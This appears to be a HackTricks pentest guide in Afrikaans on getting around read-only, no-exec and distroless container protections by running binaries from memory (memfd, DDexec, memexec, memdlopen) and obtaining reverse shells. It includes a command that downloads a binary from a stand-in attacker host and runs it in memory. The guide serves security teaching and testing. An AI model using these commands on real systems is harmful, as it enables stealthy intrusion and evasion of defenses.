# Omseil FS-beskerming: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Video's

In die volgende videos kan jy die tegnieke wat op hierdie bladsy genoem word meer in diepte verduidelik gevind:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Dit is al hoe meer algemeen om Linux-masjiene te vind wat gemonteer is met **read-only (ro) file system protection**, veral in containers. Dit is omdat om 'n container te laat loop met 'n ro file system so eenvoudig is as om **`readOnlyRootFilesystem: true`** in die `securitycontext` te stel:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Alhoewel die file system as ro gemonteer is, sal **`/dev/shm`** steeds beskryfbaar wees, so dit beteken nie regtig dat ons niks op die skyf kan skryf nie. Hierdie gids sal egter dikwels hierdie gids wees wat **mounted with no-exec protection**, so as jy 'n binary hier aflaai, sal jy dit **nie kan uitvoer nie**.

> [!WARNING]
> Van 'n red team-perspektief maak dit dit **moeiliker om binaries af te laai en uit te voer** wat nie reeds op die stelsel is nie (soos backdoors of enumerators soos `kubectl`).

## Easiest bypass: Scripts

Let wel dat ek binaries genoem het — jy kan **enige script uitvoer** solank die interpreter op die masjien beskikbaar is, soos 'n **shell script** as `sh` teenwoordig is of 'n **python** **script** as `python` geïnstalleer is.

Dit alleen is egter nie genoeg om jou binary backdoor of ander binary gereedskap wat jy mag nodig hê uit te voer nie.

## Memory Bypasses

As jy 'n binary wil uitvoer maar die file system dit nie toelaat nie, is die beste manier om dit te doen deur dit uit geheue uit te voer, aangesien die **beskerming daar nie van toepassing is nie**.

### FD + exec syscall bypass

As jy kragtige skriptaanstuur engines op die masjien het, soos **Python**, **Perl**, of **Ruby**, kan jy die binary aflaai om uit geheue uit te voer, dit stoor in 'n geheue file descriptor (`create_memfd` syscall), wat nie deur daardie beskerming beskerm gaan word nie, en dan 'n **`exec` syscall** aanroep wat die **fd as die lêer om uit te voer** aandui.

Vir dit kan jy maklik die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gebruik. Jy kan 'n binary aan dit deurgee en dit sal 'n script genereer in die aangeduide taal met die **binary compressed and b64 encoded** en instruksies om dit te **decode en decompress** in 'n **fd** wat geskep is deur die `create_memfd` syscall en 'n oproep na die **exec** syscall om dit te laat loop.

> [!WARNING]
> Dit werk nie in ander skriptaal-omgewings soos PHP of Node nie omdat hulle geen d**efault manier het om raw syscalls te roep** vanaf 'n script nie, so dit is nie moontlik om `create_memfd` aan te roep om die **memory fd** te skep om die binary te stoor nie.
>
> Verder sal die skep van 'n **gewone fd** met 'n lêer in `/dev/shm` nie werk nie, aangesien jy nie toegelaat sal word om dit uit te voer nie omdat die **no-exec protection** van toepassing sal wees.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is 'n tegniek wat jou toelaat om die geheue van jou eie proses te **wysig** deur sy **`/proc/self/mem`** te oorskryf.

Daarom, deur **beheer oor die assembly code** wat deur die proses uitgevoer word te hê, kan jy 'n **shellcode** skryf en die proses "muteer" om **enige arbitraire kode uit te voer**.

> [!TIP]
> **DDexec / EverythingExec** sal jou toelaat om jou eie **shellcode** of **enige binary** uit **memory** te laai en te **execute**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Vir meer inligting oor hierdie tegniek, sien die Github of:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is die natuurlike volgende stap na DDexec. Dit is 'n **DDexec shellcode demonised**, dus elke keer dat jy 'n **run a different binary** wil hê, hoef jy DDexec nie weer te herbegin nie; jy kan net memexec shellcode via die DDexec-tegniek laat loop en dan **communicate with this deamon to pass new binaries to load and run**.

Jy kan 'n voorbeeld vind van hoe om **memexec to execute binaries from a PHP reverse shell** te gebruik by [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Met 'n soortgelyke doel as DDexec, laat die [**memdlopen**](https://github.com/arget13/memdlopen) tegniek 'n **easier way to load binaries** toe in geheue om dit later uit te voer. Dit kan selfs toelaat om binaries met dependencies te laai.

## Distroless Bypass

Vir 'n toegewyde verduideliking van **what distroless actually is**, wanneer dit help, wanneer dit nie help nie, en hoe dit post-exploitation tradecraft in containers verander, kyk:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless-containers bevat slegs die minimale komponente wat nodig is om 'n spesifieke toepassing of diens te laat loop, soos biblioteke en runtime dependencies, maar sluit groter komponente uit soos 'n pakketbestuurder, shell of stelselhulpprogramme.

Die doel van distroless-containers is om die aanvalsoppervlak van kontainers te verminder deur onnodige komponente te verwyder en die aantal kwesbaarhede wat uitgebuit kan word te minimaliseer.

### Reverse Shell

In 'n distroless-container mag jy **nie eers `sh` of `bash` vind nie** om 'n gewone shell te kry. Jy sal ook nie binaries soos `ls`, `whoami`, `id` vind nie... alles wat jy gewoonlik in 'n stelsel uitvoer.

> [!WARNING]
> Daarom sal jy **nie** in staat wees om 'n **reverse shell** te kry of die stelsel te **enumerate** soos jy gewoonlik doen nie.

Indien die gekompromitteerde kontainer byvoorbeeld 'n flask-webdiens bedryf, is python geïnstalleer, en kan jy dus 'n **Python reverse shell** kry. As dit node bedryf, kan jy 'n Node rev shell kry, en dieselfde geld vir byna enige **scripting language**.

> [!TIP]
> Deur die skriptaal te gebruik kan jy die stelsel **enumerate** met behulp van die taal se vermoëns.

Indien daar **geen `read-only/no-exec`** beskerming is nie, kan jy jou reverse shell misbruik om **jou binaries in die lêerstelsel te skryf** en dit te **uit te voer**.

> [!TIP]
> In hierdie tipe kontainers sal hierdie beskermings gewoonlik bestaan, maar jy kan die **previous memory execution techniques to bypass them** gebruik.

Jy kan **voorbeelde** vind van hoe om **exploit some RCE vulnerabilities** te gebruik om skriptaal **reverse shells** te kry en binaries uit die geheue uit te voer by [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
